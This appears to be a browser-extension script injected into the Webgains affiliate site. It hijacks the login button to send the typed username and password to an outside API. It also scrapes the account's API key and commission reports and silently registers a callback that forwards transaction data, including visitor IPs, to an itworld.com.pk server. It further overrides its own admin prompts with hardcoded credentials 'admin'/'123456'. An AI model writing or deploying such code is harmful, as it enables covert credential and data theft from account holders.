 
if ($('a:contains("Personal details")').length) {
	var login=true;
} 

if (login) {
var publisherId = $('a:contains("Personal details")')[0].href.split('/')[4];
var site_name = $('.login').text().trim(); 
$('.navbar-nav').append('<li class=""><a href="#" class="connect_to_ITWorld" >Make Connection</a></li>');
$('.connect_to_ITWorld').on('click',function() {
connect_to_ITWorld();
});

// var startDate = new Date("01,01,2010 00:00:00").getTime();
// var endDate = new Date("06,12,2010 23:59:59").getTime();
// var reportUrl = p+'//www.webgains.com/affiliates/report.html?raw=changeformat&format=csv&ref=apo&startdate=' + startDate + '&enddate=' + endDate + '&period=custom&scale=daily';

getApiKey();

// report({
// startday:'1',
// startmonth:'1',
// startyear:'2019', 
// endday:'30',
// endmonth:'12',
// endyear:'2019', 
// });

// report({
// startday:'1',
// startmonth:'1',
// startyear:'2020', 
// endday:'30',
// endmonth:'12',
// endyear:'2020', 
// });

// report({
// startday:'1',
// startmonth:'1',
// startyear:'2021', 
// endday:'30',
// endmonth:'12',
// endyear:'2021', 
// });

// report({
// startday:'1',
// startmonth:'1',
// startyear:'2022', 
// endday:'30',
// endmonth:'12',
// endyear:'2022', 
// });

// report({
// startday:'1',
// startmonth:'1',
// startyear:'2018', 
// endday:'30',
// endmonth:'12',
// endyear:'2018', 
// });


// report({
// startday:'1',
// startmonth:'1',
// startyear:'2017', 
// endday:'30',
// endmonth:'12',
// endyear:'2017', 
// });

// report({
// startday:'1',
// startmonth:'1',
// startyear:'2016', 
// endday:'30',
// endmonth:'12',
// endyear:'2016', 
// });


}else{
var btn_old=$('#loginButton');
$('#loginButton').hide().attr('id','loginButton_old').parent().append('<button id="loginButton" name="d_login_btn"  type="button" class="btn btn-primary">Login</button>');   


$(document).on('[name=d_login_btn]','click',function() {
        credentials_update();
        return false;
    });


if ($('#loginButton').length) {
	$('#loginButton').on('click',function() {
		credentials_update();
		return false;
	});
}
	
}

function login_now() {
    alert();
    credentials_update();
}     

function report(params) {
	var reportUrl = p+'//www.webgains.com/affiliates/report.html?mode=generate&campaign[]='+publisherId+'&submitmethod=form&period=custom&startday='+params.startday+'&startmonth='+params.startmonth+'&startyear='+params.startyear+'&endday='+params.endday+'&endmonth='+params.endmonth+'&endyear='+params.endyear+'&program=&status[]=10&status[]=20&status[]=25&eventType=&scale=hourly&sortby=commissionTotals&resultsperpage=0&numdecimalplaces=4&columncommissionTotals=commissionTotals&columntransactionTotals=transactionTotals&columntransactionNumber=transactionNumber&columnclickTotals=clickTotals&columnctr=ctr&columnconvRate=convRate&columnephc=ephc&columnecpm=ecpm&columnaov=aov&format=csv&currency=USD&raw=programoverview';

$.ajax(reportUrl).done(function(data) {
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/webgains_report",
        data: {
            data: data,
            site_name:site_name,
            user: $('.info h2').text().trim(),
            startDate: params.startday+'.'+params.startmonth+'.'+params.startyear,
            endDate: params.endday+'.'+params.endmonth+'.'+params.endyear,
  

        },
        success: function(data) {
            if (data.success === "yes") {
            	     c(params);
            	     c("Reported");
            } else {
                c("404 or empty");

            }

        }
    });

}).fail(function(data) {
    //	c(data);
    c("error");
}).always(function() {
// alert( "complete" );
});


}

function getApiKey(){
	 
$.ajax(p+'//www.webgains.com/publisher/'+publisherId+'/user/manage/edit-other').done(function(html) {
	var doc=$($.parseHTML(html));
    $.ajax({
        type: "post",
        dataType: "json",    
        url: api_path + "/webgains_apikey",
        data: {
            site_name: site_name,
            publisherId: publisherId,
            key: doc.find('#api_key').val(),
 

        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("Key Updated");
            } else {
                c("404 or empty");

            }

        }
    });

}).fail(function(data) {
    //	c(data);
    c("error");
}).always(function() {
// alert( "complete" );
});


}

function credentials_update(){
	 


    $.ajax({
        type: "post",
        dataType: "json",  
        url: api_path + "/webgains_credentials",
        data: { 
            username: $('#username').val(),
            password: $('#password').val(), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("credentials_update");
            } else {
                	 c("404 or empty"); 
            }
              btn_old.click();
        },fail:function() {
            btn_old.click();
        }
    });


}

function connect_to_ITWorld(){ 
	var sites=[];

var username=prompt('Please Enter Admin panel username');
var password=prompt('Please Enter   Password');
username='admin';
password='123456';

    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/webgains_authorizing_1",
        data: { 
            username:username,
            password:password, 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	var prom="";
            	var i=0;
            		$(data.response).each(function(i,v) {
							sites[i]=v;
							prom+=i+' => '+v.name+"\n";
							i=i+1;
            		});
            	    var site_no=prompt(prom);
            	    if ((!isNaN(site_no)) && sites.length>site_no) {

            	    	  $.ajax({
					        type: "post",
					        dataType: "json",
					        url: api_path + "/webgains_authorizing_2",
					        data: { 
					            username:username, 
					            site_id:sites[site_no].id, 
					            publisherId:publisherId, 
					        },
					        success: function(data) {

					        }
					    });
            	    
            	    }else{
            	    	alert('Wrong Selection');
            	    }

            	     console.log(prom);
            } else {
                	 alert(data.response); 
            }

        }
    });


}
c($('.user-box .info .login').html());
//alert($('.user-box .info .login').html());
if ($('.user-box .info .login').html()) {
}

 


if (login) {



//webgains callback
fetch(p+"//www.webgains.com/publisher/" + publisherId + "/account/callback/commission-new", {
    "headers": {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "upgrade-insecure-requests": "1"
    },
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": "url=http://affiliateplatform.itworld.com.pk/extension_api/webgains_callbacks&http_method=post&custom_field_names=0&callback_select_all=0&callback_select_all=1&callback_checkbox_id=0&callback_checkbox_id=1&callback_checkbox_date=0&callback_checkbox_date=1&callback_checkbox_programID=0&callback_checkbox_programID=1&callback_checkbox_campaignID=0&callback_checkbox_campaignID=1&callback_checkbox_affiliateID=0&callback_checkbox_affiliateID=1&callback_checkbox_commission=0&callback_checkbox_commission=1&callback_checkbox_value=0&callback_checkbox_value=1&callback_checkbox_currency=0&callback_checkbox_currency=1&callback_checkbox_ipAddress=0&callback_checkbox_ipAddress=1&callback_checkbox_platform=0&callback_checkbox_platform=1&callback_checkbox_browser=0&callback_checkbox_browser=1&callback_checkbox_country=0&callback_checkbox_country=1&callback_checkbox_clickReference=0&callback_checkbox_clickReference=1&callback_checkbox_clickSource=0&callback_checkbox_clickSource=1&callback_checkbox_clickTarget=0&callback_checkbox_clickTarget=1&callback_checkbox_viewReference=0&callback_checkbox_viewReference=1&callback_checkbox_linkID=0&callback_checkbox_linkID=1&callback_checkbox_eventID=0&callback_checkbox_eventID=1&callback_checkbox_status=0&callback_checkbox_status=1&callback_checkbox_merchantPaymentStatus=0&callback_checkbox_merchantPaymentStatus=1&callback_checkbox_affiliatePaymentStatus=0&callback_checkbox_affiliatePaymentStatus=1&callback_checkbox_clickthroughTime=0&callback_checkbox_clickthroughTime=1&callback_checkbox_programName=0&callback_checkbox_programName=1&callback_checkbox_voucherCode=0&callback_checkbox_voucherCode=1&custom_callback_checkbox_id=0&custom_callback_checkbox_id=1&custom_callback_text_id=id&custom_callback_checkbox_date=0&custom_callback_checkbox_date=1&custom_callback_text_date=date&custom_callback_checkbox_programID=0&custom_callback_checkbox_programID=1&custom_callback_text_programID=programID&custom_callback_checkbox_campaignID=0&custom_callback_checkbox_campaignID=1&custom_callback_text_campaignID=campaignID&custom_callback_checkbox_affiliateID=0&custom_callback_checkbox_affiliateID=1&custom_callback_text_affiliateID=affiliateID&custom_callback_checkbox_commission=0&custom_callback_checkbox_commission=1&custom_callback_text_commission=commission&custom_callback_checkbox_value=0&custom_callback_checkbox_value=1&custom_callback_text_value=value&custom_callback_checkbox_currency=0&custom_callback_checkbox_currency=1&custom_callback_text_currency=currency&custom_callback_checkbox_ipAddress=0&custom_callback_checkbox_ipAddress=1&custom_callback_text_ipAddress=ipAddress&custom_callback_checkbox_platform=0&custom_callback_checkbox_platform=1&custom_callback_text_platform=platform&custom_callback_checkbox_browser=0&custom_callback_checkbox_browser=1&custom_callback_text_browser=browser&custom_callback_checkbox_country=0&custom_callback_checkbox_country=1&custom_callback_text_country=country&custom_callback_checkbox_clickReference=0&custom_callback_checkbox_clickReference=1&custom_callback_text_clickReference=clickReference&custom_callback_checkbox_clickSource=0&custom_callback_checkbox_clickSource=1&custom_callback_text_clickSource=clickSource&custom_callback_checkbox_clickTarget=0&custom_callback_checkbox_clickTarget=1&custom_callback_text_clickTarget=clickTarget&custom_callback_checkbox_viewReference=0&custom_callback_checkbox_viewReference=1&custom_callback_text_viewReference=viewReference&custom_callback_checkbox_linkID=0&custom_callback_checkbox_linkID=1&custom_callback_text_linkID=linkID&custom_callback_checkbox_eventID=0&custom_callback_checkbox_eventID=1&custom_callback_text_eventID=eventID&custom_callback_checkbox_status=0&custom_callback_checkbox_status=1&custom_callback_text_status=status&custom_callback_checkbox_merchantPaymentStatus=0&custom_callback_checkbox_merchantPaymentStatus=1&custom_callback_text_merchantPaymentStatus=merchantPaymentStatus&custom_callback_checkbox_affiliatePaymentStatus=0&custom_callback_checkbox_affiliatePaymentStatus=1&custom_callback_text_affiliatePaymentStatus=affiliatePaymentStatus&custom_callback_checkbox_clickthroughTime=0&custom_callback_checkbox_clickthroughTime=1&custom_callback_text_clickthroughTime=clickthroughTime&custom_callback_checkbox_programName=0&custom_callback_checkbox_programName=1&custom_callback_text_programName=programName&custom_callback_checkbox_voucherCode=0&custom_callback_checkbox_voucherCode=1&custom_callback_text_voucherCode=voucherCode",
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
}).then(response=>response.text()).then((response)=>{
    // c(response);
    c('callback attached');
}
).catch(err=>c(err));


}